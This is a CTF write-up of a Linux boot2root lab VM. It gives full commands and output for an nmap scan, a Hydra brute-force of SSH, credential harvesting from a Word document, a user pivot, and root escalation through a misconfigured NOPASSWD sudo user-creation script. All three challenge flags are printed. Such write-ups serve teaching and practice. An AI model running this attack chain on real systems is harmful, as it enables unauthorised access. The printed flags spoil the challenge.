---
title: "Spray And Pray I, II, III"
summary: "LigaCTF 2026 ligactf2026, forensics, reverse engineering writeup covering Spray And Pray I, II, III with analysis, solution steps, and final recovery notes."
date: 2026-05-31
tags:
  - ctf
  - ligactf2026
  - forensics
  - reverse-engineering
  - boot2root
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://owasp.org/www-chapter-kuala-lumpur/owaspmy.jpeg"
---
## Challenge Information

|Field|Value|
|---|---|
|Challenge|Spray and Pray I, II, III|
|Category|Boot2Root / Linux|
|Target IP|`[REDACTED_LOCAL_IP]`|
|Attacker OS|Kali Linux|
|User Flag 1|`OWASPKL{a2377c9ddd1837b32c82f4774a53e7a3}`|
|User Flag 2|`OWASPKL{d73aa3d24c1fb6ce993a38efe5505369}`|
|Root Flag|`OWASPKL{05400e69198b6036bc1c05302435648e}`|

---

## 1. Reconnaissance

A full TCP scan was performed against the target.

```bash
export IP=[REDACTED_LOCAL_IP]
mkdir -p scans loot

ping -c 2 $IP
sudo nmap -Pn -n -p- --min-rate 3000 -oN scans/full.txt $IP
```

The host was reachable and only one TCP port was open.

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

A service/version scan was then executed against SSH.

```bash
sudo nmap -Pn -n -sC -sV -p22 -oN scans/ssh.txt $IP
```

Result:

```text
22/tcp open  ssh  OpenSSH 10.2p1 Ubuntu 2ubuntu3.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH was exposed, so the attack path was focused on credential discovery and user pivoting.

![pasted-image-20260601015231](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015231.png)

---

## 2. SSH Credential Attack

The challenge name and hint suggested password spraying or dictionary-based SSH testing. The username `abel` was tested against `rockyou.txt` using Hydra.

```bash
hydra -l abel -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 8 -f -I -o loot/hydra_abel.txt
cat loot/hydra_abel.txt
```

Hydra found a valid SSH credential.

```text
[22][ssh] host: [REDACTED_LOCAL_IP]   login: abel   password: [REDACTED_PASSWORD]
```

The valid credential was:

```text
abel:[REDACTED_PASSWORD]
```

![pasted-image-20260601015409](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015409.png)

---

## 3. Initial Foothold

SSH login was performed using the discovered credentials.

```bash
ssh abel@[REDACTED_LOCAL_IP]
```

Password:

```text
[REDACTED_PASSWORD]
```

After login, the current user and host were verified.

```bash
whoami
id
hostname
```

Output:

```text
abel
uid=1006(abel) gid=1006(abel) groups=1006(abel)
spraynpray
```

The first local flag was found on Abel’s Desktop.

```bash
ls -la ~/Desktop
cat ~/Desktop/local1.txt
```

Output:

```text
OWASPKL{a2377c9ddd1837b32c82f4774a53e7a3}
```

![pasted-image-20260601015502](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015502.png)

---

## 4. Post-Exploitation Enumeration as Abel

Abel’s home directory was enumerated for readable files.

```bash
find ~ -maxdepth 3 -type f -ls 2>/dev/null
ls -la ~/Documents
```

An interesting Microsoft Word document was found.

```text
/home/abel/Documents/Minit_Mesyuarat_2026_Password_Guideline.docx
```

The file was readable and located inside Abel’s `Documents` directory.

![pasted-image-20260601015531](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015531.png)

```text
-rw-rw-r-- 1 niki niki 16335 May 23 19:34 Minit_Mesyuarat_2026_Password_Guideline.docx
```

The document was copied back to Kali for analysis.

```bash
scp abel@$IP:/home/abel/Documents/Minit_Mesyuarat_2026_Password_Guideline.docx loot/
```

The text content was extracted from the `.docx` file using `unzip`.

```bash
unzip -p loot/Minit_Mesyuarat_2026_Password_Guideline.docx word/document.xml \
| sed 's/<[^>]*>/ /g' \
| tr -s ' '
```

The document was a corporate password guideline written in Malay. It listed meeting attendees including `Cik Niki Azman` and `En. Abel Salleh`, then showed multiple example passwords.

Relevant password examples included:

![pasted-image-20260601015638](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015638.png)

```text
niki_ily3000@2019
[REDACTED_PASSWORD]
C5c56879cbb62d314bf76582c78bcfb7
```

The stronger password example was selected for pivot testing.

```text
[REDACTED_PASSWORD]
```

![pasted-image-20260601015555](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015555.png)

---

## 5. User Pivot to Niki

From the `abel` shell, the leaked password candidate was tested against user `niki`.

```bash
su - niki
```

Password:

```text
[REDACTED_PASSWORD]
```

The pivot succeeded.

```bash
whoami
id
hostname
```

Output:

```text
niki
uid=1004(niki) gid=1004(niki) groups=1004(niki)
spraynpray
```

The second local flag was found on Niki’s Desktop.

```bash
cat ~/Desktop/local2.txt
```

Output:

```text
OWASPKL{d73aa3d24c1fb6ce993a38efe5505369}
```

![pasted-image-20260601015714](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015714.png)

---

## 6. Privilege Escalation Enumeration

Niki’s sudo privileges were checked.

```bash
sudo -l
```

Output:

```text
User niki may run the following commands on spraynpray:
    (ALL) NOPASSWD: /home/niki/Downloads/gen_user.sh
```

This showed that `niki` could execute `/home/niki/Downloads/gen_user.sh` as root without entering a password.

The script was inspected.

```bash
ls -la ~/Downloads
cat ~/Downloads/gen_user.sh
```

Output:

```text
-r-xr--r-- 1 root root 139 May 23 19:58 gen_user.sh
```

Script content:

```bash
#!/bin/bash
USERNAME=$1
PASSWORD=[REDACTED_PASSWORD]
useradd -m -s /bin/bash "$USERNAME"
echo "$USERNAME:$PASSWORD" | chpasswd
usermod -aG sudo "$USERNAME"
```

The script accepted attacker-controlled arguments, created a new Linux user, set the user’s password, and added the user to the `sudo` group. Because the script was executed through sudo, these actions were performed as root.

![pasted-image-20260601015752](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015752.png)

---

## 7. Privilege Escalation

A new user was created with a controlled password.

```bash
sudo /home/niki/Downloads/gen_user.sh g10d '[REDACTED_PASSWORD]'
```

The new user was then accessed.

```bash
su - g10d
```

Password:

```text
	[REDACTED_PASSWORD]
```

The user’s identity and group membership were checked.

```bash
whoami
id
groups
sudo -l
```

Output:

```text
g10d
uid=1008(g10d) gid=1008(g10d) groups=1008(g10d),27(sudo)
g10d sudo
User g10d may run the following commands on spraynpray:
    (ALL : ALL) ALL
    (ALL) ALL
```

Because `g10d` was added to the `sudo` group, a root shell was obtained.

```bash
sudo -i
```

Root access was verified.

```bash
whoami
id
hostname
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
spraynpray
```

![pasted-image-20260601015857](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015857.png)

---

## 8. Root Flag

Inside `/root`, `[REDACTED_ROOT_FILE]` was not present. The valid proof file was `proof.txt`.

```bash
cd /root
ls -la
cat [REDACTED_ROOT_FILE]
```

Output:

```text
cat: [REDACTED_ROOT_FILE]: No such file or directory
```

The directory listing showed `proof.txt`.

```bash
cat proof.txt
```

Output:

```text
OWASPKL{05400e69198b6036bc1c05302435648e}
```

![pasted-image-20260601015923](/images/writeups/local-ctf/ligactf2026/spray-and-pray/pasted-image-20260601015923.png)

---

## 9. Vulnerability Summary

|Weakness|Description|Impact|
|---|---|---|
|Weak SSH password|User `abel` used `[REDACTED_PASSWORD]`, which was present in `rockyou.txt`.|Initial SSH access|
|Sensitive document exposure|Abel’s home directory contained a readable password guideline document.|Password discovery for lateral movement|
|Password reuse / predictable password pattern|A password example from the document worked for user `niki`.|User pivot from `abel` to `niki`|
|Sudo misconfiguration|`niki` could run `gen_user.sh` as root without a password.|Root privilege escalation|
|Unsafe root script logic|`gen_user.sh` accepted username and password arguments, then added the created user to `sudo`.|Creation of a new sudo-capable account|

---

## 10. Attack Chain Summary

```text
1. Confirmed target reachability with ping.
2. Performed full TCP scan with Nmap.
3. Found only SSH open on port 22.
4. Used Hydra with username abel and rockyou.txt.
5. Discovered valid SSH credential: abel:[REDACTED_PASSWORD].
6. Logged in over SSH as abel.
7. Captured first flag from /home/abel/Desktop/local1.txt.
8. Enumerated Abel’s home directory.
9. Found Minit_Mesyuarat_2026_Password_Guideline.docx in /home/abel/Documents.
10. Copied the .docx to Kali using scp.
11. Extracted text from the .docx using unzip and sed.
12. Identified password candidate: [REDACTED_PASSWORD].
13. Used su to pivot from abel to niki.
14. Captured second flag from /home/niki/Desktop/local2.txt.
15. Checked sudo privileges for niki.
16. Found NOPASSWD sudo permission for /home/niki/Downloads/gen_user.sh.
17. Inspected gen_user.sh and confirmed it creates a user and adds it to sudo.
18. Created user g10d with password [REDACTED_PASSWORD].
19. Switched to g10d and used sudo -i.
20. Obtained root shell.
21. Read final flag from /root/proof.txt.
```

---

## 11. Scope and Legitimacy Statement

This solve was performed only against the intended live challenge VM through the exposed network service and local Linux privilege escalation path.

Used techniques:

```text
Network reconnaissance
SSH credential testing
Local file enumeration
Document-based credential discovery
User pivoting
Sudo permission abuse
Root proof capture
```

The following methods were not used:

```text
VM disk mounting
Offline modification of VM files
Backend infrastructure access
Direct flag extraction from virtual disks
Host-side tampering
Reverse engineering VM configuration files for flags
```

---
